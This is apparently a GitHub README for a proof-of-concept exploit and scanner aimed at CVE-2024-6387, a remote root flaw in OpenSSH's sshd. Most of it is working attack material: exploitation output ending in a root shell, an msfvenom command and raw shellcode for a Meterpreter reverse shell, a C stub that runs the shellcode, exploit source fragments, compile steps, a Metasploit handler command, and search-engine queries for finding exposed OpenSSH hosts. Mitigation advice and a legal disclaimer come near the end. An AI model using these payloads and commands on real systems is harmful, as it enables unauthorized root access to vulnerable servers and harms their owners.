<div align="right">
  <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2FCVE-2024-6387"><img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2FCVE-2024-6387&label=Visitors&countColor=%2337d67a"/>
  </a>
</div>


# ![openssh](/img/openssh_logo.png) CVE-2024-6387 - PoC     

## 📜 Description
> Note: This script is a quick prototype PoC, expect some errors and bugs may occur. 
> Tested on: Kali Linux, ParrotSec, Ubuntu 22.04

Remote Unauthenticated Code Execution Vulnerability in OpenSSH server

A signal handler race condition was found in OpenSSH's server (sshd), where a client does not authenticate within LoginGraceTime seconds (120 by default, 600 in old OpenSSH versions), then sshd's SIGALRM handler is called asynchronously. However, this signal handler calls various functions that are not async-signal-safe, for example, syslog().

## 📁 Table of Contents
- 📖 [Details](#-details)
- ⚙️ [Usage](#-usage)
- 🔍 [Host Discovery](#-host-discovery)
- 🛠️ [Mitigation](#-mitigation)
- 💁 [References](#-references)
- 📌 [Author](#-author)
- 📢 [Disclaimer](#-disclaimer)
 

## ✍🏻 Details
You can find the technical details [here](https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt).

The flaw, discovered by researchers at Qualys in `May 2024`, and assigned the identifier CVE-2024-6387, is due to a signal handler race condition in sshd that allows unauthenticated remote attackers to execute arbitrary code as root.

"If a client does not authenticate within LoginGraceTime seconds (120 by default), then sshd's SIGALRM handler is called asynchronously and calls various functions that are not async-signal-safe," 

"A remote unauthenticated attacker can take advantage of this flaw to execute arbitrary code with root privileges."

## ⚙️ Usage
## Scanning OpenSSH Server  
> Requirement: python3 latest
```bash
$ python3 CVE-2024-6387.py --exploit 192.168.56.101 --port 22

 ██████╗ ██████╗ ███████╗███╗   ██╗███████╗███████╗██╗  ██╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██║  ██║
██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗███████╗███████║
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║╚════██║╚════██║██╔══██║
╚██████╔╝██║     ███████╗██║ ╚████║███████║███████║██║  ██║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
   Author: l0n3m4n / Scanner: @xaitax / PoC: @7etsuo 
    
Exploiting vulnerabilities...
Attempting exploitation with glibc base: 0xb7200000
Attempt 0 of 20000
Received SSH version: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
Received KEX_INIT (1024 bytes)
send_packet: Resource temporarily unavailable
send_packet: Resource temporarily unavailable
send_packet: Resource temporarily unavailable
send_packet: Resource temporarily unavailable
.....
Exploitation successful..!

~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root) 
```

### Exporting (csv,txt,json)
```bash
$ python3 CVE-2024-6387.py -s 192.168.56.101 -p 22 -o json -f result.json
```

### Multiple targets
```bash
$ python3 CVE-2024-6387.py -s targets.txt -p 22 -o json -f result.json
```

### Adding timeout 
```bash
$ python3 CVE-2024-6387.py -s 192.168.56.101 -p 22 -t 10 -o json -f result.json
```
### Network ranges
```bash
$ python3 CVE-2024-6387.py -s 192.168.56.101/24 -p 22 -t 5 -o json -f result.json
```
### Custom port 
```bash
$ python3 CVE-2024-6387.py -s 192.168.56.101 -p 2244 -t 5 -o json -f result.json
```
# Escalation Process

## Getting Reverse shell 
 
```bash 
# Generating a shellcode 
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=9999 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of c file: 574 bytes

unsigned char buf[] =
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x27\x0f\xc0\xa8\x38\x64\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";
```
### Custom payload
```c
#include <stdio.h>

// A placeholder of your custom payload 
const char shellcode[] =
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x27\x0f\xc0\xa8\x38\x64\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

int main() {
    // Execute shellcode
    printf("Executing shellcode...\n");
    void (*sc)() = (void(*)())shellcode;
    sc();

    return 0;
}

```

### Actual payload
```c
#include <stdio.h>
 

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

// Possible glibc base addresses (for ASLR bypass)
uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof (GLIBC_BASES) / sizeof (GLIBC_BASES[0]);

// Shellcode placeholder (replace with actual shellcode)
unsigned char shellcode[] = "\x90\x90\x90\x90";
```
### Compiling and initiating payload
```bash
# compiling payload
$ gcc -shared -o exploit.so -fPIC 7etsuo-regreSSHion.c 
```
### Executing payload
```bash
# Once you receive a successful exploitation message, the msfconsole automatically initiates a Meterpreter session.
$ python3 CVE-2024-6387.py --exploit 192.168.56.101 --p 22 
```
### Catching payload 
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.100; set LPORT 9999; exploit -j"
```

## 🔍 Host Discovery 
- **Hunter**: `/product.name="OpenSSH"`
- **FOFA**: `app="OpenSSH"`
- **SHODAN**: `product:"OpenSSH"`
- **CENSYS**: `(openssh) and labels=remote-access`

## 🛠️ Mitigation
- **Patch Management**: Swiftly applying available patches for OpenSSH is critical to closing the vulnerability gap. Timely patching ensures that known exploits cannot be leveraged against your systems, thereby reducing the window of opportunity for attackers.

- **Enhanced Access Control**: Limiting SSH access through network-based controls adds an additional layer of defense. This approach minimizes exposure to potential attackers by restricting SSH connections to only authorized networks or IP addresses. Implementing tools like firewall rules or using VPNs for secure access can effectively enforce these restrictions.

- **Network Segmentation**: Dividing your network into segments helps contain the impact of a potential breach. By segmenting critical systems and sensitive data from less critical parts of your network, you reduce the risk of lateral movement by attackers. This segmentation can be complemented with strict access controls and monitoring to detect and respond to any unauthorized attempts to breach these segments.

- **Intrusion Detection Systems (IDS)**: Deploying IDS or intrusion prevention systems (IPS) enables real-time monitoring of network traffic and system logs. These systems can detect suspicious activities and potential exploitation attempts associated with the regreSSHion vulnerability. Alerts triggered by such systems allow for prompt investigation and mitigation before significant damage can occur.

- **Monitoring for Exploitation Attempts**: Continuous monitoring of network and system logs is crucial. Look for any unusual patterns or activities that could indicate an attempt to exploit the OpenSSH vulnerability. This proactive approach helps in identifying and responding to threats before they can cause harm.

## 💁 References
- **Original Author**: [CVE-2024-6387 Scanner](https://github.com/xaitax/CVE-2024-6387_Check)
- **Original Author**: [CVE-2024-6387 PoC](https://github.com/zgzhang/cve-2024-6387-poc)

## Further Referencess
- http://www.openwall.com/lists/oss-security/2024/07/01/12
- https://access.redhat.com/security/cve/CVE-2024-6387
- https://bugzilla.redhat.com/show_bug.cgi?id=2294604
- https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt
- https://github.com/zgzhang/cve-2024-6387-poc
- https://ubuntu.com/security/CVE-2024-6387
- https://ubuntu.com/security/notices/USN-6859-1
- https://www.suse.com/security/cve/CVE-2024-6387.html
- https://explore.alas.aws.amazon.com/CVE-2024-6387.html
- https://archlinux.org/news/the-sshd-service-needs-to-be-restarted-after-upgrading-to-openssh-98p1/
- https://www.openssh.com/txt/release-9.8
- https://lists.mindrot.org/pipermail/openssh-unix-announce/2024-July/000158.html
- https://lists.mindrot.org/pipermail/openssh-unix-dev/2024-July/041431.html
- https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server
- https://www.theregister.com/2024/07/01/regresshion_openssh/
- https://news.ycombinator.com/item?id=40843778
- https://security-tracker.debian.org/tracker/CVE-2024-6387
- https://github.com/oracle/oracle-linux/issues/149
- https://github.com/rapier1/hpn-ssh/issues/87
- https://stackdiary.com/openssh-race-condition-in-sshd-allows-remote-code-execution/
- https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0010
- http://www.openwall.com/lists/oss-security/2024/07/01/13
- https://security.netapp.com/advisory/ntap-20240701-0001/

## 📌 Author
- [Facebook](https://facebook.com/l0n3m4n)
- [Twitter (X)](https://twitter.com/l0n3m4n)
- [Medium](https://medium.com/l0n3m4n)
- [Website](https://l0n3m4n.github.io)

## 📢 Disclaimer
- **Important Note**:
    - ***This tool is developed and used solely for authorized penetration testing and red teaming exercises only. It is designed to identify and exploit vulnerabilities in OpenSSH's server, on glibc-based Linux systems. Unauthorized use of this tool is strictly prohibited, The owner of this tool is not responsible for any unauthorized access or malicious use of the tool.***
- **Legal Notice**:
    - ***Unauthorized use of this tool on systems or networks without explicit authorization from the respective owners may violate applicable laws and regulations. Users are responsible for ensuring compliance with legal and ethical standards governing cybersecurity testing and assessments.***
